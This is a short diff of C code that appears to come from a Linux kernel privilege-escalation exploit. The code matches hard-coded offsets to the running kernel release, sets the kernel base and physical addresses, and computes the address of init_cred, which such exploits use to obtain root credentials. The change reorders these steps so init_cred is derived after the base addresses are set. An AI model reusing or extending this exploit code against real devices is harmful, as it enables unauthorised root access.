@@ -87,19 +87,16 @@ static int select_offsets(void) {
     if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
       active_offsets = &known_offsets[i];
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
-      /* Publish per-device symbol addresses that other TUs need. INIT_CRED
-       * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
-       * table entry rather than target.h's compile-time constant. */
-      g_init_cred_image = INIT_CRED;
+      if (active_offsets->kimage_text_base) {
+        p0_kimage_text_base = active_offsets->kimage_text_base;
+      }
       if (active_offsets->kernel_phys_load) {
         p0_kernel_phys_load = active_offsets->kernel_phys_load;
       }
       if (active_offsets->phys_offset) {
         p0_phys_offset = active_offsets->phys_offset;
       }
-      if (active_offsets->kimage_text_base) {
-        p0_kimage_text_base = active_offsets->kimage_text_base;
-      }
+      g_init_cred_image = INIT_CRED;
       pr_info("init_cred image=%016zx alias=%016zx\n",
               (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
       return 0;
